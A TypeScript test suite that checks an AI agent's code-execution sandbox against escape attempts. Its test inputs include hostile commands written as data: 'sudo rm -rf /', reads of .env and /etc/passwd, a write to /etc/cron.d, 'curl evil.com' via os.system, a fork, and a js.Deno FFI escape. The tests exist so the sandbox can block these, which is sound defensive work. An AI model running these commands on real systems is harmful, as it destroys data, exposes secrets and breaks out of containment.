/**
 * Fase 5 — adversarial security tests for the CodeAct sandbox.
 *
 * The 10 tests below come verbatim from REMEDIATION_SYSTEM_ARCHITECTURE.md
 * §4 Fase 5 (lines 419-429). Each one exercises ONE escape vector. The
 * suite must be 100% green before the PR can merge — the
 * .github/workflows/sandbox-security.yml gate enforces this on every PR
 * touching `worker/src/sandbox/**`.
 *
 * Local dev:
 *   - Tests 3/4/5 run anywhere (parent validators only — no Deno).
 *   - Tests 1/2/6/7/8/9/10 require Deno + Pyodide cache on the host
 *     (per worker/src/sandbox/SETUP.md). They skip on machines without
 *     Deno installed; the CI gate is the real authority.
 */

import { describe, it, before } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { resolve as resolvePath } from "node:path";

const ORIGINAL_DB_URL = process.env.DATABASE_URL;
if (!ORIGINAL_DB_URL) {
  process.env.DATABASE_URL = "postgresql://test:test@localhost:5432/test";
}

const HAS_DENO = (() => {
  try {
    const r = spawnSync("deno", ["--version"], { stdio: "pipe" });
    return r.status === 0;
  } catch {
    return false;
  }
})();

const SKIP_DENO = HAS_DENO ? undefined : { skip: "deno not installed locally — CI gate runs the full suite" };

// Point the runner at the in-repo pyodide-runner.ts so we can exercise the
// real Deno subprocess without needing a /opt/sandbox install on dev boxes.
const REPO_RUNNER = resolvePath(process.cwd(), "src/sandbox/pyodide-runner.ts");
process.env.SANDBOX_RUNNER_PATH = REPO_RUNNER;
process.env.SANDBOX_READ_ROOT = resolvePath(process.cwd(), "src/sandbox");

interface ShellCall {
  command?: string;
  path?: string;
  patch?: string;
}

function makeShell(opts: {
  onExec?: (cmd: string) => { exitCode: number; stdout: string; stderr: string };
  onWrite?: (path: string, content: string) => void;
} = {}): {
  shell: import("../sandbox/tool-bindings.js").ContainerShell;
  calls: ShellCall[];
} {
  const calls: ShellCall[] = [];
  const shell: import("../sandbox/tool-bindings.js").ContainerShell = {
    exec: async (command) => {
      calls.push({ command });
      const r = opts.onExec?.(command) ?? { exitCode: 0, stdout: "", stderr: "" };
      return { ...r, durationMs: 1 };
    },
    write: async (path, content) => {
      calls.push({ path });
      opts.onWrite?.(path, content);
    },
    applyPatch: async (patch) => {
      calls.push({ patch });
      return { ok: true, summary: "noop" };
    },
  };
  return { shell, calls };
}

describe("Fase 5 sandbox — parent-validator adversarial tests (run anywhere)", () => {
  let executeSandboxTool: typeof import("../sandbox/tool-bindings.js").executeSandboxTool;

  before(async () => {
    const mod = await import("../sandbox/tool-bindings.js");
    executeSandboxTool = mod.executeSandboxTool;
  });

  // Test 3 — `await run_command("sudo rm -rf /")` must fail (parent rejects)
  it("3. blocks sudo via run_command parent validator", async () => {
    const { shell, calls } = makeShell();
    const r = await executeSandboxTool("run_command", { command: "sudo rm -rf /" }, shell);
    assert.equal(r.ok, false);
    assert.match((r as { error: string }).error, /dangerous pattern/i);
    assert.equal(calls.length, 0); // never reached the shell
  });

  // Test 4 — `await read_file(".env")` must fail (BLOCKED_FILE_PATTERNS)
  it("4. blocks .env read via parent validator", async () => {
    const { shell, calls } = makeShell();
    const r = await executeSandboxTool("read_file", { path: ".env" }, shell);
    assert.equal(r.ok, false);
    assert.match((r as { error: string }).error, /sensitive/i);
    assert.equal(calls.length, 0);
  });

  // Test 5 — `await write_file("package-lock.json", ...)` must fail
  it("5. blocks lockfile write via parent validator", async () => {
    const { shell, calls } = makeShell();
    const r = await executeSandboxTool(
      "write_file",
      { path: "package-lock.json", content: "{}" },
      shell,
    );
    assert.equal(r.ok, false);
    assert.match((r as { error: string }).error, /blocked/i);
    assert.equal(calls.length, 0);
  });

  // Defense-in-depth: unknown tool names must be rejected before any
  // handler runs. Not in the spec list but a direct consequence of
  // GPT54 §B7 Rule 1 — the parent must reject anything outside its
  // small allowlist.
  it("rejects unknown tool names before any handler runs", async () => {
    const { shell, calls } = makeShell();
    const r = await executeSandboxTool("eval", { code: "1+1" }, shell);
    assert.equal(r.ok, false);
    assert.match((r as { error: string }).error, /unknown tool/);
    assert.equal(calls.length, 0);
  });

  // Path-traversal sanity: read_file with '..' must fail
  it("blocks path traversal in read_file", async () => {
    const { shell } = makeShell();
    const r = await executeSandboxTool("read_file", { path: "../../etc/passwd" }, shell);
    assert.equal(r.ok, false);
    assert.match((r as { error: string }).error, /\.\./);
  });

  // Path-traversal sanity: absolute path must fail
  it("blocks absolute paths in write_file", async () => {
    const { shell } = makeShell();
    const r = await executeSandboxTool("write_file", { path: "/etc/cron.d/x", content: "x" }, shell);
    assert.equal(r.ok, false);
    assert.match((r as { error: string }).error, /absolute/);
  });
});

describe("Fase 5 sandbox — Pyodide-behavior adversarial tests (require Deno)", () => {
  let runSandbox: typeof import("../sandbox/runner.js").runSandbox;
  let shellNoop: import("../sandbox/tool-bindings.js").ContainerShell;

  before(async () => {
    const mod = await import("../sandbox/runner.js");
    runSandbox = mod.runSandbox;
    shellNoop = makeShell().shell;
  });

  // Test 1 — os.system("curl evil.com") must fail
  it("1. os.system is unavailable in Pyodide (no os.system / no subprocess)", SKIP_DENO ?? {}, async () => {
    if (SKIP_DENO) return;
    const out = await runSandbox({
      sessionId: "test-1",
      purpose: "adversarial-os-system",
      shell: shellNoop,
      code: `
import os
try:
    os.system("curl evil.com")
    result = {"escaped": True}
except Exception as e:
    result = {"blocked": True, "error": str(e)}
`,
    });
    assert.equal(out.ok, true);
    const r = (out as { result: { blocked?: boolean; escaped?: boolean } }).result;
    // Either Pyodide raises (good) or returns a non-zero (also good).
    // What MUST NOT happen: r.escaped === true with a real network call.
    assert.notEqual(r.escaped, true);
  });

  // Test 2 — subprocess.Popen(...) must fail
  it("2. subprocess module is unavailable in Pyodide", SKIP_DENO ?? {}, async () => {
    if (SKIP_DENO) return;
    const out = await runSandbox({
      sessionId: "test-2",
      purpose: "adversarial-subprocess",
      shell: shellNoop,
      code: `
try:
    import subprocess
    subprocess.Popen(["echo", "escaped"])
    result = {"escaped": True}
except Exception as e:
    result = {"blocked": True, "error": str(e)[:200]}
`,
    });
    assert.equal(out.ok, true);
    const r = (out as { result: { escaped?: boolean } }).result;
    assert.notEqual(r.escaped, true);
  });

  // Test 6 — Python that never sets result → structured error, not crash
  it("6. missing 'result' returns null cleanly (no parent crash)", SKIP_DENO ?? {}, async () => {
    if (SKIP_DENO) return;
    const out = await runSandbox({
      sessionId: "test-6",
      purpose: "adversarial-no-result",
      shell: shellNoop,
      code: `# user code that forgets to assign result
x = 1 + 1
`,
    });
    // Either ok with result=null, or ok=false — both are structured outcomes.
    // What MUST NOT happen: the parent throws or hangs.
    if (out.ok) {
      assert.equal(out.result, null);
    } else {
      assert.ok(typeof out.error === "string" && out.error.length > 0);
    }
  });

  // Test 7 — infinite loop → watchdog kills within ~61s
  it("7. infinite loop killed by watchdog within wall-clock budget", SKIP_DENO ?? {}, async () => {
    if (SKIP_DENO) return;
    const start = Date.now();
    const out = await runSandbox({
      sessionId: "test-7",
      purpose: "adversarial-infinite-loop",
      shell: shellNoop,
      code: `
while True:
    pass
`,
    });
    const elapsed = Date.now() - start;
    assert.equal(out.ok, false);
    assert.match((out as { error: string }).error, /wall-clock|killed/i);
    // Allow generous slack for Pyodide cold-start + Deno spawn time.
    assert.ok(elapsed < 90_000, `expected kill within 90s, took ${elapsed}ms`);
  });

  // Test 8 — stdout flood (1GB) → watchdog kills, parent not OOM
  it("8. stdout flood killed by stdout-cap watchdog (parent stays alive)", SKIP_DENO ?? {}, async () => {
    if (SKIP_DENO) return;
    const out = await runSandbox({
      sessionId: "test-8",
      purpose: "adversarial-stdout-flood",
      shell: shellNoop,
      // The runner sends each line as JSON to the parent. A flood of
      // garbage tool_request lines exceeds the 64KB stdout cap quickly.
      code: `
import sys
for _ in range(100000):
    sys.stdout.write("x" * 1024 + "\\n")
result = "should not reach"
`,
    });
    assert.equal(out.ok, false);
  });

  // Test 9 — Pyodide FFI escape via js.Deno global → must fail
  it("9. js.Deno global is not exposed to Pyodide", SKIP_DENO ?? {}, async () => {
    if (SKIP_DENO) return;
    const out = await runSandbox({
      sessionId: "test-9",
      purpose: "adversarial-ffi-escape",
      shell: shellNoop,
      code: `
try:
    from js import Deno  # must not exist
    result = {"escaped": True, "has_deno": True}
except ImportError:
    result = {"blocked": True}
except Exception as e:
    result = {"blocked": True, "error": str(e)[:200]}
`,
    });
    assert.equal(out.ok, true);
    const r = (out as { result: { escaped?: boolean } }).result;
    assert.notEqual(r.escaped, true);
  });

  // Test 10 — fork bomb simulation in Python → must be impossible
  it("10. fork bomb is impossible (no os.fork, no subprocess)", SKIP_DENO ?? {}, async () => {
    if (SKIP_DENO) return;
    const out = await runSandbox({
      sessionId: "test-10",
      purpose: "adversarial-fork-bomb",
      shell: shellNoop,
      code: `
try:
    import os
    os.fork()
    result = {"escaped": True}
except (AttributeError, OSError, NotImplementedError) as e:
    result = {"blocked": True, "error": str(e)[:200]}
`,
    });
    assert.equal(out.ok, true);
    const r = (out as { result: { escaped?: boolean } }).result;
    assert.notEqual(r.escaped, true);
  });
});
